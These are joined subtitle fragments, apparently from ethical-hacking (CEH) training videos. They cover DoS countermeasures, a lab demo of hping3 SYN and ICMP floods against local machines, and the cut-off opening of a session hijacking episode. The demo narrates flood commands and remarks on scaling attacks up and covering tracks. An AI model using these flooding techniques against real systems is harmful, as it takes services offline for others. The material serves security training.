to\n\n649\n00:31:40.834 --> 00:31:44.657\nrespond, that we as the tenant,\nessentially, as the customer, may have\n\n650\n00:31:44.657 --> 00:31:48.937\nproblems if that stuff can reflect out of\nthe cloud back into our private networks.\n\n651\n00:31:48.937 --> 00:31:52.520\nIf we have a hybrid solution where\nwe're on-prem and off-prem, and\n\n652\n00:31:52.520 --> 00:31:55.011\nif it can trace back\nthrough those connections,\n\n653\n00:31:55.011 --> 00:31:58.961\nwe may actually be seeing those attacks\npropagated through the cloud into our\n\n654\n00:31:58.961 --> 00:32:01.964\ninfrastructure, which can\nalso prove to be a challenge.\n\n655\n00:32:01.964 --> 00:32:05.896\nAnd so load balancing, throttling,\ntraffic pattern analysis,\n\n656\n00:32:05.896 --> 00:32:09.136\nThese are all gonna be things\nthat we want to consider.\n\n657\n00:32:09.136 --> 00:32:13.521\nWe may wanna be thinking about the ability\nto be able to do as we said filtering and\n\n658\n00:32:13.521 --> 00:32:17.578\nusing our knowledge of network traffic\nto understand how to filter out bad\n\n659\n00:32:17.578 --> 00:32:19.230\ntraffic would be important.\n\n660\n00:32:19.230 --> 00:32:22.620\nWe've talked about things\nlike reputation filtering and\n\n661\n00:32:22.620 --> 00:32:27.710\nusing services like DNS SEC and\ndomain sender identification.\n\n662\n00:32:27.710 --> 00:32:31.540\nReverse authentication through\nDNS would also be valuable,\n\n663\n00:32:31.540 --> 00:32:34.320\nblack hole filtering would be good,\nwhere essentially we're\n\n664\n00:32:34.320 --> 00:32:38.740\ndiscarding packets at the routing level\nif they're not being identified properly.\n\n665\n00:32:38.740 --> 00:32:41.555\nWe should be able to enable\nIP source guard in Cisco,\n\n666\n00:32:41.555 --> 00:32:44.595\nwhich has similar features in\nother systems as well, but your\n\n667\n00:32:44.595 --> 00:32:48.745\nsource guard is another great way to think\nabout preventing these kind of attacks.\n\n668\n00:32:48.745 --> 00:32:50.458\nRFC 3704 filtering for\n\n669\n00:32:50.458 --> 00:32:54.785\nthat kind of traffic would also be\na good point of reference for that.\n\n670\n00:32:54.785 --> 00:32:58.100\nI don't know if we give out the actual\nRFC reference they can probably just\n\n671\n00:32:58.100 --> 00:32:58.641\nlook it up.\n\n672\n00:32:58.641 --> 00:33:00.048\nYou can go out to the site and\njust look them up.\n\n673\n00:33:00.048 --> 00:33:03.451\nBut RFC 3704 would be one to\nlook at in doing filtering for\n\n674\n00:33:03.451 --> 00:33:06.602\nthat particular kind of\ntraffic would also be helpful.\n\n675\n00:33:06.602 --> 00:33:08.580\nSo, keep that in mind.\n\n676\n00:33:08.580 --> 00:33:11.643\nWe should deny any externalized\nCMP traffic access.\n\n677\n00:33:11.643 --> 00:33:14.750\nWe shouldn't allow people to ping\ninbound for instance from outside.\n\n678\n00:33:14.750 --> 00:33:18.320\nWe should secure remote administrative and\nconnectivity interfaces to prevent any\n\n679\n00:33:18.320 --> 00:33:20.660\ninbound testing,\nthat could probe our perimeters.\n\n680\n00:33:20.660 --> 00:33:23.600\nWanna make sure we do input\nvalidation thoroughly so\n\n681\n00:33:23.600 --> 00:33:25.190\nwe understand what's\ncoming through the wire.\n\n682\n00:33:25.190 --> 00:33:26.210\nYeah, it's exactly that one there.\n\n683\n00:33:26.210 --> 00:33:31.370\nWe wanna make sure that we\nare doing new input validation,\n\n684\n00:33:31.370 --> 00:33:32.780\nbuffer overflow protection.\n\n685\n00:33:32.780 --> 00:33:35.905\nWe'll talk about this in up coming\nepisodes with web hacking and\n\n686\n00:33:35.905 --> 00:33:38.440\nSQL injection and the importance\nof that kind of stuff there.\n\n687\n00:33:38.440 --> 00:33:42.840\nGet rid of unnecessary functions\nlike gets or copy functions,\n\n688\n00:33:42.840 --> 00:33:46.130\nthings that could potentially be\nused against us to manipulate data.\n\n689\n00:33:46.130 --> 00:33:49.200\nPrevent return addresses from being\noverwritten so we can't see and\n\n690\n00:33:49.200 --> 00:33:50.770\nunderstand what's going on with them.\n\n691\n00:33:50.770 --> 00:33:52.910\nThis is kind of things we often\ntalk about as countermeasure.\n\n692\n00:33:52.910 --> 00:33:54.600\nSure it's right that will be helpful so\n\n693\n00:33:54.600 --> 00:33:56.820\nwe wanna make sure we're aware\nof that at the ISP level.\n\n694\n00:33:56.820 --> 00:34:00.530\nWe've talked about working with them to\nensure that they, and they usually are.\n\n695\n00:34:00.530 --> 00:34:02.630\nLet's be clear, ISPs are good about this.\n\n696\n00:34:02.630 --> 00:34:04.206\nThey understand the need to do filtering.\n\n697\n00:34:04.206 --> 00:34:05.930\nThey understand the value of doing this.\n\n698\n00:34:05.930 --> 00:34:08.970\nSo it's usually not a big deal there but\ndoing TCP\n\n699\n00:34:08.970 --> 00:34:13.800\nintercept on the Cisco iOS side would also\nbe helpful if you enable TCP intercept.\n\n700\n00:34:13.800 --> 00:34:17.770\nWe can then go in a configure the system\nto block and drop some of this traffic,\n\n701\n00:34:17.770 --> 00:34:21.880\nso you would go in and either permit or\ndeny and setup your permit or\n\n702\n00:34:21.880 --> 00:34:25.080\ndeny lists, right, for TCP on the router.\n\n703\n00:34:25.080 --> 00:34:28.730\nSo we could go in and do that, and\nthen we would go in and take a look at\n\n704\n00:34:28.730 --> 00:34:32.610\nthe TCP intercept mode and take a look or\nwatch, and you'll see what's going on.\n\n705\n00:34:32.610 --> 00:34:36.470\nSo we can set the mode, intercept or\nwatch, and just basically, dynamically or\n\n706\n00:34:36.470 --> 00:34:38.830\npassively filter what's going on there.\n\n707\n00:34:38.830 --> 00:34:39.980\nWe can look at appliances.\n\n708\n00:34:39.980 --> 00:34:44.610\nThere's a lot of physical hardware that\ncan be done, or put into play for this.\n\n709\n00:34:44.610 --> 00:34:46.950\nSo we just wanna think about\nsome of these devices.\n\n710\n00:34:46.950 --> 00:34:50.890\nAgain, some of the biggies,\nyou've got Palo Alto, you've got F5,\n\n711\n00:34:50.890 --> 00:34:55.460\nyou've got what's another\nbig one that does hardware.\n\n712\n00:34:55.460 --> 00:34:58.700\nCertainly Cisco does all this kind of\nstuff you sort of can always rely on them.\n\n713\n00:34:58.700 --> 00:35:01.420\nBut there are all these other hardware\nmanufacturers that specialize.\n\n714\n00:35:01.420 --> 00:35:04.640\nBarracuda, is one I couldn't think of\nBarracuda specializes in this kind of\n\n715\n00:35:04.640 --> 00:35:08.250\nstuff and has devices that will\ndo these kind of things, so\n\n716\n00:35:08.250 --> 00:35:10.060\nwe just wanna be thinking about this.\n\n717\n00:35:11.110 --> 00:35:14.100\nMaking sure we're using host\nlevel firewalls, right,\n\n718\n00:35:14.100 --> 00:35:18.220\nto add that additional layer of security\nat the host, as we often think about, so\n\n719\n00:35:18.220 --> 00:35:21.940\nthat we can hopefully prevent attacks that\nmay get all the way through the wire.\n\n720\n00:35:21.940 --> 00:35:24.690\nAll these kinds of things are gonna be\nthings that we would wanna be thinking\n\n721\n00:35:24.690 --> 00:35:27.742\nabout and bring to bear in\nthe general service conversation.\n\n722\n00:35:27.742 --> 00:35:31.070\nWe're gonna go in and take a look at our\nnext episode, at some hands on stuff,\n\n723\n00:35:31.070 --> 00:35:33.160\nwe'll show you how to do\na little flood attacking and\n\n724\n00:35:33.160 --> 00:35:35.270\nmake sure we understand\nthe mechanics of it.\n\n725\n00:35:35.270 --> 00:35:37.520\nBut I think we've done a fairly good\njob of talking about the basics and\n\n726\n00:35:37.520 --> 00:35:40.290\nthe concepts, we wanna obviously\nbring to bear some of that knowledge.\n\n727\n00:35:40.290 --> 00:35:41.074\nWe'll do that going forward.\n\n728\n00:35:41.074 --> 00:35:42.035\nBut have any thoughts,\n\n729\n00:35:42.035 --> 00:35:44.780\njust closing observations that you\nwanna throw in the table there?\n\n730\n00:35:44.780 --> 00:35:47.579\n&gt;&gt; No,\nI'm excited to see how it all works.\n\n731\n00:35:47.579 --> 00:35:49.264\n&gt;&gt; Well, okay.\n\n732\n00:35:49.264 --> 00:35:52.831\n&gt;&gt; [LAUGH] This embodied\nthumbs up right there, right.\n\n733\n00:35:52.831 --> 00:35:55.900\nSee it better when you're back and\nmy nose is kind of, right there.\n\n734\n00:35:55.900 --> 00:35:57.082\nThere we go, all right.\n\n735\n00:35:57.082 --> 00:36:01.040\n&gt;&gt; Now there's in the house service\nattack can definitely be nasty and\n\n736\n00:36:01.040 --> 00:36:03.960\nas you were saying I like the idea of\nthrowing firewalls on the inside as well\n\n737\n00:36:03.960 --> 00:36:08.820\nbecause way back in the earlier episode,\nwe talked about how often we are I\n\n738\n00:36:08.820 --> 00:36:12.910\ndon't say it was tricked, but\nwe start thinking about attacks.\n\n739\n00:36:12.910 --> 00:36:14.850\nWe always think about\nit from the outside and\n\n740\n00:36:14.850 --> 00:36:18.800\nits that inside guy that got mad\nbecause didn't get a raise, or\n\n741\n00:36:18.800 --> 00:36:22.670\nsomebody parked in his spot, those are\nthe ones you really gotta watch out for.\n\n742\n00:36:22.670 --> 00:36:24.121\n&gt;&gt; Yeah I haven't forgotten\nabout that whole valet thing by\n\n743\n00:36:24.121 --> 00:36:24.741\nthe way,\n&gt;&gt; [LAUGH]\n\n744\n00:36:24.741 --> 00:36:26.101\n&gt;&gt; That we dealt with last time.\n\n745\n00:36:26.101 --> 00:36:27.225\nI'm still a little sore about that.\n\n746\n00:36:27.225 --> 00:36:28.117\nSo,-\n&gt;&gt; I really shouldn't have\n\n747\n00:36:28.117 --> 00:36:28.621\nbrought that up.\n\n748\n00:36:28.621 --> 00:36:29.860\n&gt;&gt; If you find your\ntires are flat when you\n\n749\n00:36:29.860 --> 00:36:30.590\ngo outside,\n&gt;&gt; [LAUGH]\n\n750\n00:36:30.590 --> 00:36:32.250\n&gt;&gt; I'm not saying it was me.\n\n751\n00:36:32.250 --> 00:36:35.041\nI'm just pointing out that,\nthose things happen.\n\n752\n00:36:35.041 --> 00:36:36.750\n&gt;&gt; [LAUGH]\n&gt;&gt; Those squirrels,\n\n753\n00:36:36.750 --> 00:36:38.010\nthey can be pretty vicious.\n\n754\n00:36:38.010 --> 00:36:40.536\nI was talking about it earlier\nwith Travis, vicious squirrels.\n\n755\n00:36:40.536 --> 00:36:41.624\n&gt;&gt; All right.\n\n756\n00:36:41.624 --> 00:36:43.545\n[LAUGH]\n&gt;&gt; All right.\n\n757\n00:36:43.545 --> 00:36:46.633\n&gt;&gt; All right, Adam, great discussion\nthere on denial of service,\n\n758\n00:36:46.633 --> 00:36:50.619\ndistributed denial of service, looking at\nthe different methods that can be used,\n\n759\n00:36:50.619 --> 00:36:53.538\nwhere these attacks can be used,\nhow we can protect ourselves\n\n760\n00:36:53.538 --> 00:36:56.980\nagainst denial service attacks as well,\nso we thank you for that.\n\n761\n00:36:56.980 --> 00:36:58.850\nHope everybody out there enjoyed watching.\n\n762\n00:36:58.850 --> 00:37:05.700\nSigning off for ITProTV,

Very good.\nI actually performed a denial of service\n\n12\n00:00:35.600 --> 00:00:40.170\nattack on myself here by having the wrong\ninterface set up so we could do a demo.\n\n13\n00:00:40.170 --> 00:00:43.690\nSo, when we take a look at denial of\nservice, and we're going to do this in\n\n14\n00:00:43.690 --> 00:00:46.930\na minute in the lab environment, we're\ngoing to use hping3, which is a Linux\n\n15\n00:00:46.930 --> 00:00:50.050\nbased tool, it's gonna let us just\nessentially propagate Ping packets.\n\n16\n00:00:50.050 --> 00:00:51.270\nWe'll take a look at sin floods.\n\n17\n00:00:51.270 --> 00:00:52.500\nWe'll set up quickly.\n\n18\n00:00:52.500 --> 00:00:54.750\nSin flood, we'll open up Wireshark.\n\n19\n00:00:54.750 --> 00:00:56.190\nWe'll see the monitoring.\n\n20\n00:00:56.190 --> 00:00:57.450\nWe'll do an ICMP flood.\n\n21\n00:00:57.450 --> 00:00:59.430\nAnd we'll do a little bit of that as well.\n\n22\n00:00:59.430 --> 00:01:00.430\nVery basic, very simple demo.\n\n23\n00:01:00.430 --> 00:01:01.450\nWe're not gonna take too long.\n\n24\n00:01:01.450 --> 00:01:02.740\nReally, not a lot of mystery.\n\n25\n00:01:02.740 --> 00:01:04.430\nNot a lot of magic here.\n\n26\n00:01:04.430 --> 00:01:08.190\nWe've talked a lot about that fact that\nwe're essentially just propagating massive\n\n27\n00:01:08.190 --> 00:01:11.490\nflows of data and\ntargeting them to go outbound so,\n\n28\n00:01:11.490 --> 00:01:12.960\nwe're to jump in and take a look.\n\n29\n00:01:12.960 --> 00:01:16.480\nOne thing I will just tell you\nquickly is you couls see that it's\n\n30\n00:01:16.480 --> 00:01:20.380\nvery very difficult to see the actual\ntext in the hping window and putty, and\n\n31\n00:01:20.380 --> 00:01:23.130\nI apologize we played around trying\nto get this to be a little bigger.\n\n32\n00:01:23.130 --> 00:01:24.300\nIt is what it is.\n\n33\n00:01:24.300 --> 00:01:27.310\nI did create the command strings,\nput them in a notepad file.\n\n34\n00:01:27.310 --> 00:01:29.859\nI'll extend that out and show it to you\nin a minute as soon as we're done, so\n\n35\n00:01:29.859 --> 00:01:31.004\nyou could just see what they are.\n\n36\n00:01:31.004 --> 00:01:36.553\nBut basically, what we've got hping3S for\nsource, 192,168.0.1.\n\n37\n00:01:36.553 --> 00:01:40.790\nAnd then, we're going to attack\nthe 192.168.0.3 machine.\n\n38\n00:01:40.790 --> 00:01:43.940\nWe're going to use the flood\nparameter to do that.\n\n39\n00:01:43.940 --> 00:01:46.230\nSo, we're going to launch that,\nget that started.\n\n40\n00:01:48.400 --> 00:01:51.554\nAnd, we just make sure we're, there we go.\n\n41\n00:01:51.554 --> 00:01:54.140\nAnd there, there we go.\n\n42\n00:01:54.140 --> 00:01:57.110\nAll right, so,\nwe are running in the flood mode.\n\n43\n00:01:57.110 --> 00:01:58.090\nWe've got that going.\n\n44\n00:01:58.090 --> 00:02:01.040\nLet's just extend this out real quick for\na second.\n\n45\n00:02:01.040 --> 00:02:04.780\nWe'll take a look as we start to flood,\nand by the way, there is a little\n\n46\n00:02:04.780 --> 00:02:08.540\ndelay now in the machine because\nobviously as we're flooding it, right,\n\n47\n00:02:08.540 --> 00:02:13.960\nit's gonna run slowly but you can see\nthose pieces of information down there.\n\n48\n00:02:13.960 --> 00:02:18.950\nI'm just gonna move the console\nover here so when we do type,\n\n49\n00:02:18.950 --> 00:02:19.830\nwe'll be able to see it.\n\n50\n00:02:19.830 --> 00:02:24.590\nI'm gonna bring up Wireshark and I'm gonna\ngo ahead and just start to capture there.\n\n51\n00:02:24.590 --> 00:02:30.755\nAnd let me make sure that\nwe're capturing there.\n\n52\n00:02:30.755 --> 00:02:31.662\nOops, did I choose the wrong one?\n\n53\n00:02:31.662 --> 00:02:33.244\nAnd it shows the wrong interface.\n\n54\n00:02:33.244 --> 00:02:34.147\nOne second.\n\n55\n00:02:34.147 --> 00:02:38.258\n&gt;&gt; [CROSSTALK]\n&gt;&gt; Yeah it's just really slow,\n\n56\n00:02:38.258 --> 00:02:40.560\njust want to make sure\nI hit the right one.\n\n57\n00:02:40.560 --> 00:02:41.940\nWe'll give it just a second.\n\n58\n00:02:41.940 --> 00:02:43.160\nIt's just that you can see,\n\n59\n00:02:43.160 --> 00:02:45.740\nthere's the delay now because\nwe're effectively executing\n\n60\n00:02:45.740 --> 00:02:49.110\nthe denial of service attack from the\nLinux box against the machine we're on.\n\n61\n00:02:49.110 --> 00:02:50.258\nThere we go, right there,\nthat's what I was waiting on.\n\n62\n00:02:50.258 --> 00:02:54.379\nAnd you can see that,\nall that traffic's coming flooding in and\n\n63\n00:02:54.379 --> 00:02:58.080\nyou could see that it's\njust being slammed, right?\n\n64\n00:02:58.080 --> 00:03:00.876\nNonstop.\nYou could see it kinda jittering there,\n\n65\n00:03:00.876 --> 00:03:03.567\nas if it's gonna go nuclear and\nexplode on us.\n\n66\n00:03:03.567 --> 00:03:05.820\n&gt;&gt; [LAUGH]\n&gt;&gt; We're essentially executing a denial\n\n67\n00:03:05.820 --> 00:03:07.890\nservice attack against\nourselves right now.\n\n68\n00:03:07.890 --> 00:03:11.200\nIf we let this run long enough,\nwe'll probably get an out of memory error.\n\n69\n00:03:11.200 --> 00:03:13.180\nWe'll actually be able to buffer overflow.\n\n70\n00:03:13.180 --> 00:03:14.928\nWireshark, there we go, right there.\n\n71\n00:03:14.928 --> 00:03:17.751\nAnd you could see, we're out of\nmemory cuz we captured so much data,\n\n72\n00:03:17.751 --> 00:03:20.286\nthat essentially all that inbound\ntraffic has propagated and\n\n73\n00:03:20.286 --> 00:03:22.105\nwere sucking resources out of the machine.\n\n74\n00:03:22.105 --> 00:03:24.487\n&gt;&gt; Wow.\n&gt;&gt; This is one way that we can execute\n\n75\n00:03:24.487 --> 00:03:28.065\nthe denial service attack pretty\nquickly by using hping3 and\n\n76\n00:03:28.065 --> 00:03:29.870\njust using the flood command.\n\n77\n00:03:29.870 --> 00:03:34.276\nWe're just slamming the box with sin\ncommands and we're not synchronizing and\n\n78\n00:03:34.276 --> 00:03:39.209\nsetting up through a handshake but, rather\nliterally, just establishing that initial\n\n79\n00:03:39.209 --> 00:03:42.910\nconnection and then leaving\nthe attack packets open and pending.\n\n80\n00:03:42.910 --> 00:03:46.270\nAnd if I let this run long enough,\nwe'll actually blue screen the box which\n\n81\n00:03:46.270 --> 00:03:48.542\nwould be kinda cool except it's\ninconvenient during the demo.\n\n82\n00:03:48.542 --> 00:03:51.770\n&gt;&gt; [LAUGH]\n&gt;&gt; So what we're gonna do is go in here.\n\n83\n00:03:51.770 --> 00:03:54.410\nNow, we're going to break that.\n\n84\n00:03:54.410 --> 00:03:58.970\nSo let's go in, and\nlet's attempt to break that real quick.\n\n85\n00:03:58.970 --> 00:04:00.306\nGet CTRL + C in there.\n\n86\n00:04:00.306 --> 00:04:01.742\nWe'll break that, so\n\n87\n00:04:01.742 --> 00:04:06.770\nthat way we're not actually trying\nto knock the box off totally.\n\n88\n00:04:06.770 --> 00:04:09.170\nAnd so, we'll set up for\nour next little demo here.\n\n89\n00:04:09.170 --> 00:04:10.776\nRight, so\nwhat we're gonna do now is go in.\n\n90\n00:04:10.776 --> 00:04:15.460\nThat was a sin flood, so what we'll do now\nis go in and do a little ICMP flood so,\n\n91\n00:04:15.460 --> 00:04:16.500\nagain, we'll do hping.\n\n92\n00:04:18.550 --> 00:04:23.580\nAnd it would help if I could type hping3,\nthere we go, and let me\n\n93\n00:04:23.580 --> 00:04:27.026\njust make sure I did that correctly since\nI cannot actually see what I'm typing.\n\n94\n00:04:27.026 --> 00:04:28.745\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm using the force cuz it is so\n\n95\n00:04:28.745 --> 00:04:31.925\nsmall, I am just assuming\nit's going in correctly.\n\n96\n00:04:31.925 --> 00:04:36.005\nBut I'm typing in\nthe hping3 C100 line there.\n\n97\n00:04:36.005 --> 00:04:39.440\nWe're gonna craft 100 packets and\n\n98\n00:04:39.440 --> 00:04:42.810\nsend them against this\nmachine here in real time.\n\n99\n00:04:42.810 --> 00:04:45.320\nWe're gonna use the ICMP parameter.\n\n100\n00:04:45.320 --> 00:04:48.172\nSo that we're using ICMP packets for\nthe attack.\n\n101\n00:04:48.172 --> 00:04:51.590\n168.0.1 which is my machine.\n\n102\n00:04:51.590 --> 00:04:54.060\nSo, we're going to send\nthose inbound here.\n\n103\n00:04:54.060 --> 00:04:58.530\nMomentarily, again, we'll open up\nWireshark and be able to see this.\n\n104\n00:04:58.530 --> 00:05:01.380\nLet me actually just have it open so\nthat we can have it ready to\n\n105\n00:05:01.380 --> 00:05:04.500\ngo when we actually are ready\nto propagate the attack.\n\n106\n00:05:04.500 --> 00:05:06.360\nWe'll just make it a little quicker.\n\n107\n00:05:06.360 --> 00:05:09.680\nSo, we're just gonna get that ready to go,\nwe'll switch that on.\n\n108\n00:05:09.680 --> 00:05:13.550\nAnd now and just get that coming in.\n\n109\n00:05:13.550 --> 00:05:18.620\nAnd then, let's go ahead over here,\nlet's hit Enter and get that going.\n\n110\n00:05:18.620 --> 00:05:22.280\nAll right, there's the ping packets\nstarting to come in one at a time,\n\n111\n00:05:22.280 --> 00:05:23.570\nas you can see.\n\n112\n00:05:23.570 --> 00:05:25.710\nAnd, if we let that go long enough and\n\n113\n00:05:25.710 --> 00:05:28.380\npropagate, Rob's gonna see\nthat traffic coming in.\n\n114\n00:05:28.380 --> 00:05:30.560\nThe red highlighted packets\nare the one's that are in the black,\n\n115\n00:05:30.560 --> 00:05:33.340\nyou can't really see them in red but\nin the black highlights are the one's that\n\n116\n00:05:33.340 --> 00:05:36.960\nare coming in that are the attack packets,\nthat we're seeing streaming in.\n\n117\n00:05:36.960 --> 00:05:39.940\nNot as many as the sin flood\nas you saw because clearly\n\n118\n00:05:39.940 --> 00:05:43.640\nwe're not flooding it with the same\namount of traffic at the same time.\n\n119\n00:05:43.640 --> 00:05:48.240\nBut we are certainly able to go in, and\nif I modify that number and I use some\n\n120\n00:05:48.240 --> 00:05:51.990\nadditional parameters, I could modify the\namount of packets I'm sending inbound and\n\n121\n00:05:51.990 --> 00:05:54.140\nthe amount of time I'm taking to do it.\n\n122\n00:05:54.140 --> 00:05:58.945\nAnd if I pair this with perhaps\nthe sin flood, that box is offline.\n\n123\n00:05:58.945 --> 00:06:01.814\n&gt;&gt; Or we have some zombies to\nadd more to the attacks, or\n\n124\n00:06:01.814 --> 00:06:03.458\nreflected off of something.\n\n125\n00:06:03.458 --> 00:06:04.189\n&gt;&gt; Yup.\n\n126\n00:06:04.189 --> 00:06:06.923\nSo I could make this a lot\nmore serious than it is,\n\n127\n00:06:06.923 --> 00:06:11.691\nwhere just kind of taking our time and you\nknow politely and slowly walking through.\n\n128\n00:06:11.691 --> 00:06:15.703\nWe're not really trying to do a lot of\nharm here and we'll just let that run and\n\n129\n00:06:15.703 --> 00:06:18.585\nyou could see it's just\ngonna kind of finish up.\n\n130\n00:06:18.585 --> 00:06:20.930\nBut if we were serious about this,\n\n131\n00:06:20.930 --> 00:06:24.000\nwe would have made that an indeterminate\nnumber it would have just kept going.\n\n132\n00:06:24.000 --> 00:06:26.760\nWe want to lauch multiple\nhping sessions inbound and\n\n133\n00:06:26.760 --> 00:06:30.990\ntaken the system down so it would not\nbe very hard to do when we're again,\n\n134\n00:06:30.990 --> 00:06:34.920\njust remoting with putty from a Windows\njump box into a Linux box and\n\n135\n00:06:34.920 --> 00:06:38.360\nwhen we're remotely attacking\nthe Windows box that we're jumping from.\n\n136\n00:06:38.360 --> 00:06:39.910\nSo, it's kind of an outbound and\n\n137\n00:06:39.910 --> 00:06:43.690\nback again system just to show you\nquickly how we could do that but,\n\n138\n00:06:43.690 --> 00:06:46.850\nit gives you the idea that we could do\nall sorts of things in real life, right?\n\n139\n00:06:46.850 --> 00:06:48.598\n&gt;&gt; Yeah.\n&gt;&gt; So you always want to make sure we're\n\n140\n00:06:48.598 --> 00:06:50.620\naware of that and how that may happen.\n\n141\n00:06:50.620 --> 00:06:53.370\nAlright, so, just we were talking about\njust coming out of this whole demo and\n\n142\n00:06:53.370 --> 00:06:56.430\nthinking about the fact that\nwe were out bounding and\n\n143\n00:06:56.430 --> 00:06:59.890\nreturn tripping if you will right back\ninto the windows boxes I was suggesting.\n\n144\n00:06:59.890 --> 00:07:01.890\nWe could do, which is interesting\nin the lab environment.\n\n145\n00:07:01.890 --> 00:07:05.530\nWe could just play with this a little bit,\nmanipulate the architecture.\n\n146\n00:07:05.530 --> 00:07:07.380\nSlide a hand to show you what we're doing.\n\n147\n00:07:07.380 --> 00:07:11.110\nIn the real world, clearly, we wouldn't\njust be going out to a Linux box and\n\n148\n00:07:11.110 --> 00:07:13.540\nattacking back into where we are.\n\n149\n00:07:13.540 --> 00:07:16.160\nRight, we would attack and propagate\nthat attack out throughout the network.\n\n150\n00:07:16.160 --> 00:07:19.390\nBut we would probably use\nputty from a remote machine\n\n151\n00:07:19.390 --> 00:07:20.960\ninto the Linux box to cover our tracks.\n\n152\n00:07:20.960 --> 00:07:24.200\nSo that is something to think about and\njust potentially weave into\n\n153\n00:07:24.200 --> 00:07:26.540\nthe narrative that we've been talking\nabout with some of the other stuff.\n\n154\n00:07:26.540 --> 00:07:29.980\nI know that MIke had asked you as we got\nstarted, before we actually did this\n\n155\n00:07:29.980 --> 00:07:33.880\nto just see if we could pull up either a\nman page or some interesting info hping3.\n\n156\n00:07:33.880 --> 00:07:35.330\nYou said you had something.\n\n157\n00:07:35.330 --> 00:07:37.750\nYou threw that up, I think,\nin the chat window.\n\n158\n00:07:37.750 --> 00:07:41.490\nSo a little bit of background for\nyou on hping3, just to understand some of\n\n159\n00:07:41.490 --> 00:07:43.690\nthe commands we're using,\nsome things we could do with it.\n\n160\n00:07:43.690 --> 00:07:46.440\nPretty versatile tool,\nobviously very valuable for\n\n161\n00:07:46.440 --> 00:07:49.970\nus in the denial of service area,\nif we wanna use it for that.\n\n162\n00:07:49.970 --> 00:07:52.910\nBut remember, we're never gonna go out and\ntry to do this offensively, but\n\n163\n00:07:52.910 --> 00:07:55.480\nif we are gonna be suffering\nthe inbound effects of this,\n\n164\n00:07:55.480 --> 00:07:56.790\nwe wanna be able to defend against it.\n\n165\n00:07:56.790 --> 00:07:58.910\nSo, knowing that we can\ncut that traffic off,\n\n166\n00:07:58.910 --> 00:08:02.820\nand being able to do that at the border is\ngoing to be very important for us as well.\n\n167\n00:08:02.820 --> 00:08:03.680\n&gt;&gt; All right, Adam.\n\n168\n00:08:03.680 --> 00:08:06.440\nFantastic look at a denial\nof service in action.\n\n169\n00:08:06.440 --> 00:08:10.770\nGot to see use hping3 in order\nto propagate that attack.\n\n170\n00:08:10.770 --> 00:08:11.740\nSo we appreciate that.\n\n171\n00:08:11.740 --> 00:08:14.800\nWe hope everybody out there\nenjoyed watching this one.\n\n172\n00:08:14.800 --> 00:08:18.210\nSigning off for IT Pro TV,\nI'm Mike Rodrick.\n\n173\n00:08:18.210 --> 00:08:19.290\n&gt;&gt; I'm Adam Gordon.\n\n174\n00:08:19.290 --> 00:08:20.268\n&gt;&gt; And we'll see you next time.\n\n175\n00:08:20.268 --> 00:08:29.469\n[MUSIC]\n\n",

00:00:16.466\nI'm your host Mike Rodrick.\n\n4\n00:00:16.466 --> 00:00:19.560\nToday we're doing our CEH version 9.\n\n5\n00:00:19.560 --> 00:00:23.513\nSpecifically, in this episode, we're\ngonna be looking at session hijacking.\n\n6\n00:00:23.513 --> 00:00:25.740\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n7\n00:00:25.740 --> 00:00:26.415\nHow are you doing, Adam?\n\n8\n00:00:26.415 --> 00:00:27.536\n&gt;&gt; I'm good, I'm good.\n\n9\n00:00:27.536 --> 00:00:29.260\nHopefully everybody's doing well.\n\n10\n00:00:30.410 --> 00:00:34.970\nTalking about session hijacking and\ndifferent ways we can, essentially,\n\n11\n00:00:34.970 --> 00:00:38.710\ngo in and interact with people\nthat are communicating, but\n\n12\n00:00:38.710 --> 00:00:41.610\nobviously, clearly getting up\nto no good while doing that.\n\n13\n00:00:41.610 --> 00:00:44.670\nThe goal of session hijacking,\nit actually blends a couple of things\n\n14\n00:00:44.670 --> 00:00:46.400\nthat we've talked about in\nsome of the prior episodes.\n\n15\n00:00:46.400 --> 00:00:49.532\nWe've spoken about going out\ninto reconnoissance in general.\n\n16\n00:00:49.532 --> 00:00:52.605\nAnd so we started some of our\nvery early conversations in CEH\n\n17\n00:00:52.605 --> 00:00:55.371\ntalking about fingerprinting and\nreconnaissance,\n\n18\n00:00:55.371 --> 00:00:59.260\nand looking at different ways we may\nbe able to engage in those activities.\n\n19\n00:00:59.260 --> 00:01:03.840\nWe're gonna build on that a little bit by\nthinking about using some of those skills\n\n20\n00:01:03.840 --> 00:01:07.940\nto understand what communication is\nhappening under what circumstances.\n\n21\n00:01:07.940 --> 00:01:13.220\nFrom who, to who we'll talk about, being\nable to send information from one system,\n\n22\n00:01:13.220 --> 00:01:15.790\nand receive it over there somewhere else.\n\n23\n00:01:15.790 --> 00:01:19.988\nAnd then we also talked about the man in\nthe middle concept in some of our prior\n\n24\n00:01:19.988 --> 00:01:22.226\ndiscussions with regards to sniffing.\n\n25\n00:01:22.226 --> 00:01:25.825\nAnd so as we've gone through and\ntaking a look at the sniffing episodes,\n\n26\n00:01:25.825 --> 00:01:29.770\nif you haven't seen those, always good\nto go back and review some of that.\n\n27\n00:01:29.770 --> 00:01:33.928\nMike was fabulous in one of those episodes\nby the way, some of his best work to date.\n\n28\n00:01:33.928 --> 00:01:34.973\n&gt;&gt; Thank you very much.\n&gt;&gt; In that set of episodes.\n\n29\n00:01:34.973 --> 00:01:36.708\n&gt;&gt; [LAUGH]\n&gt;&gt; That's not saying much, but\n\n30\n00:01:36.708 --> 00:01:39.698\nI'm just saying that some of your\nbest work actually happened in that\n\n31\n00:01:39.698 --> 00:01:41.260\nparticular series.\n\n32\n00:01:41.260 --> 00:01:43.870\nWe have to give compliments along\nthe way to keep him interested.\n\n33\n00:01:43.870 --> 00:01:44.730\n&gt;&gt; It's very important.\n\n34\n00:01:44.730 --> 00:01:46.480\n&gt;&gt; We have to keep him motivated.\n\n35\n00:01:46.480 --> 00:01:48.311\nSo with sniffing, right, if you remember,\n\n36\n00:01:48.311 --> 00:01:50.494\nwe did actually talk about\na man in the middle attack.\n\n37\n00:01:50.494 --> 00:01:54.050\nWe went through, we discussed some of\nthe particulars of how that would work.\n\n38\n00:01:54.050 --> 00:01:56.670\nWe talked about being able\nto do session redirects.\n\n39\n00:01:56.670 --> 00:01:59.960\nWe talked about being able to\neither masquerade or spoof and\n\n40\n00:01:59.960 --> 00:02:03.280\nthings that nature,\nwhether it was active or passive sniffing.\n\n41\n00:02:03.280 --> 00:02:04.940\nSo we've talked about a lot\nof the building blocks,\n\n42\n00:02:04.940 --> 00:02:07.420\na lot of the parameters and\nthings that we need to understand\n\n43\n00:02:07.420 --> 00:02:10.270\nto get to the point where we\ncan do session 